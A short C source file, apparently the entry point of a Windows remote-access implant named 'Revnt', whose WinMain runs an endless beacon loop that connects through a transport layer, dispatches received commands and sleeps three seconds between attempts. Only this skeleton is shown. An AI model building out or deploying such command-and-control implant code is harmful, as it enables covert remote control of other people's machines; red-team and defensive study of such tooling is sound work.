#define SLEEP 3

#include <Revnt.h>

#include <Core.h>
#include <Transport.h>
#include <Command.h>

INSTANCE Instance = { 0 };

INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd )
{
    RevntInit();
    do
    {
        if ( ! Instance.Session.Connected )
        {
            if ( TransportInit( ) )
                CommandDispatcher();
        }

        // Instance->Win32.WaitForSingleObjectEx( NtCurrentThread(), Instance->Config.Sleeping * 1000, FALSE );

        Sleep( SLEEP * 1000 );

    } while ( TRUE );
}